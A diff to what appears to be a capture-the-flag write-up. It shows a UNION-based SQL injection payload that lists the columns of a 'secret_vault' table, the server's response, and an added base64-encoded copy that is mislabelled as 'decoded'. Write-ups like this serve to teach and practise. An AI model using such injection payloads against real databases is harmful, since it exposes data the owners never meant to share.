@@ -203,9 +203,13 @@ Plain-text payload:
 ```sql
 1' UNION SELECT group_concat(column_name)
 FROM information_schema.columns
-WHERE table_name='secret_vault'#
+WHERE table_name='secret_vault'#   
 ```
+Base64 Decoded payload:
 
+```
+MScgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkKRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucwpXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnIyAgIA==
+```
 Response:
 
 ```
@@ -214,7 +218,9 @@ id,note
 
 So `secret_vault` had two columns: `id` and `note`.
 
-**📸 [Insert screenshot here: encoded payload for column enumeration and response showing `id,note`]**
+**7.1: Encoded payload for column enumeration and response showing `id,note`**
+
+![Encoded payload for column enumeration](image_file/10.jpg)
 
 ---
 
